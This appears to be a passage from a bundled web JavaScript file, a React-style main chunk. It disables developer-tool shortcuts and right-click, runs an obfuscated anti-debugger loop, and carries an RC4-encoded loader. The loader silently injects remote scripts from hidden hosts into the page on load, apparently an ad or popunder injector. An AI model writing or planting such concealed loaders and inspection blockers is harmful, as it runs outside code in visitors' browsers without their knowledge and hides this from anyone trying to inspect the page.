    if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
       return false;
    }
    if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
       return false;
    }
    if(e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
       return false;
    }
  }
  document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
  });
  
  
var _0x2441=['Hello\x20World!','\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','init','length','counter','test','stateObject','string','while\x20(true)\x20{}','log','constructor','function\x20*\x5c(\x20*\x5c)','gger','call','debu','apply'];(function(_0x2088b6,_0x244128){var _0x58194e=function(_0x5478f4){while(--_0x5478f4){_0x2088b6['push'](_0x2088b6['shift']());}};_0x58194e(++_0x244128);}(_0x2441,0x70));var _0x5819=function(_0x2088b6,_0x244128){_0x2088b6=_0x2088b6-0x0;var _0x58194e=_0x2441[_0x2088b6];return _0x58194e;};function hi(){var _0x53244e=_0x5819,_0x6ff9c9=function(){var _0xc3967f=!![];return function(_0x53fca3,_0xd1dab3){var _0x1a2eee=_0xc3967f?function(){var _0x44e87c=_0x5819;if(_0xd1dab3){var _0x3a7ba7=_0xd1dab3[_0x44e87c('0xf')](_0x53fca3,arguments);return _0xd1dab3=null,_0x3a7ba7;}}:function(){};return _0xc3967f=![],_0x1a2eee;};}();(function(){_0x6ff9c9(this,function(){var _0x35417d=_0x5819,_0x3a97e8=new RegExp(_0x35417d('0xb')),_0x23de09=new RegExp(_0x35417d('0x1'),'i'),_0x4ada4a=_0x1b3f91(_0x35417d('0x2'));!_0x3a97e8[_0x35417d('0x5')](_0x4ada4a+'chain')||!_0x23de09['test'](_0x4ada4a+'input')?_0x4ada4a('0'):_0x1b3f91();})();}(),console[_0x53244e('0x9')](_0x53244e('0x0')));}hi();function _0x1b3f91(_0x17c303){function _0x2add7f(_0x518125){var _0x314088=_0x5819;if(typeof _0x518125===_0x314088('0x7'))return function(_0x56feb3){}[_0x314088('0xa')](_0x314088('0x8'))[_0x314088('0xf')](_0x314088('0x4'));else(''+_0x518125/_0x518125)[_0x314088('0x3')]!==0x1||_0x518125%0x14===0x0?function(){return!![];}['constructor'](_0x314088('0xe')+'gger')[_0x314088('0xd')]('action'):function(){return![];}[_0x314088('0xa')](_0x314088('0xe')+_0x314088('0xc'))[_0x314088('0xf')](_0x314088('0x6'));_0x2add7f(++_0x518125);}try{if(_0x17c303)return _0x2add7f;else _0x2add7f(0x0);}catch(_0x5da970){}}setInterval(function(){_0x1b3f91();},0xfa0);


/*<![CDATA[/* */
(function(){var a12f2a19daa150d80a62ee80c1b26018="Ef3eu3z-spq-pD-yxwChqVRu0zmvPJCsmYL3Wel6GHLsvVdMxDJleRmqah0I5YzhEkyY0po6V5Dvpzk";var a=['I8O5wrjCsDs=','NMOjfjLCjMOW','MjJ3w6QjJV7DgVk2wqBXQyxRwpEbR8KKAUvCsFTDpx9oaMO0wqk4IzgjwqRbwpRtwqvCnjHCg1d1JcOpwq7DnRjCjcKlXcOvWjxcOcK0FcKmAQ==','AxDDiA==','ER5wwpPDgHVVYcOaayY=','FsOQwoxBw4XCpmA=','L8KOwrd3MMKfbnhaw6M=','HUDCgmA=','cHLDq01IwpvDmcK9OhB4w5ABLMOzfB1kwrTDq8OCwo/CrEJFw6E8wptN','KxjDjTzCqzkKwrrDtCrCsCw=','w5XDmhTDqwLClMO7woFFcnhZOU4=','Sk3CnFV7V8KtQcOJccKww6g=','MMKdSzUBwrLCpBMNVMOvwrQbwrLDpsK3finDlG8=','KsOrwrcCbivCvsO+wq5uZR09w4PDjX5CwqkKwrzCi8OhZj/CpsOhViHDvnMDGMKdwr8=','w5HCgQ3DnG9BC8KdRUAIwobDog==','EwJwwo7DildIfcOO','Mm9/w702eAfDlw==','JMOyaTrCiMOHDFk7VRFKCA==','H8ODw6HCh8Kgw6U=','wonDjcOEw7d/w60=','DcKWw7bDusKqw5w=','EMOQwppWw4XCvVBJwqTCtMOgJw==','BxXDnGgEVmAqwpYUwpAJwqzCrcOjZFfDsAo9w6DCgcOUw7E=','w4l9woTClzfDgn7CqA==','fBdpwpvDrFURKcKRRcK0CzzDlzI=','OHsYw4IkwojDn8Ko','wonCrCZb','OHEdw5Y8woHDhQ=='];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x1f1));var b=function(c,d){c=c-0x0;var e=a[c];if(b['PpPcFg']===undefined){(function(){var h;try{var j=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');h=j();}catch(k){h=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';h['atob']||(h['atob']=function(l){var m=String(l)['replace'](/=+$/,'');var n='';for(var o=0x0,p,q,r=0x0;q=m['charAt'](r++);~q&&(p=o%0x4?p*0x40+q:q,o++%0x4)?n+=String['fromCharCode'](0xff&p>>(-0x2*o&0x6)):0x0){q=i['indexOf'](q);}return n;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['PZIdZO']=g;b['NQiAbY']={};b['PpPcFg']=!![];}var f=b['NQiAbY'][c];if(f===undefined){if(b['UcejEh']===undefined){b['UcejEh']=!![];}e=b['PZIdZO'](e,d);b['NQiAbY'][c]=e;}else{e=f;}return e;};var h=window;h[b('0x5','Bzu^')]=[[b('0x19','O$ml'),0x493c0b],[b('0x1b','^Wfz'),0x0],[b('0x11','cd!z'),'0'],[b('0x12','Gm2F'),0x0],[b('0x6','O]h3'),![]],[b('0x15','ZMo@'),0x0],[b('0x10','XInk'),!0x0]];var g=[b('0x14','XOQ['),b('0x9','Ull*'),b('0xf','7DRj'),b('0x1',']^8T')],p=0x0,k,f=function(){if(!g[p])return;k=h[b('0x4','O]h3')][b('0x18','lqNK')](b('0x1a','3edJ'));k[b('0xe','eMQ$')]=b('0x3','%m$E');k[b('0x7','O0n6')]=!0x0;var c=h[b('0x17','Ull*')][b('0x13','Fl6]')](b('0x8','lqNK'))[0x0];k[b('0xa',']^8T')]=b('0x2','AdCB')+g[p];k[b('0xb','Nn])')]=b('0x16','Nn])');k[b('0xc','sKVp')]=function(){p++;f();};c[b('0xd','hYtS')][b('0x0','sKVp')](k,c);};f();})();
/*]]>/* */






//# sourceMappingURL=main.b9682356.chunk.js.map
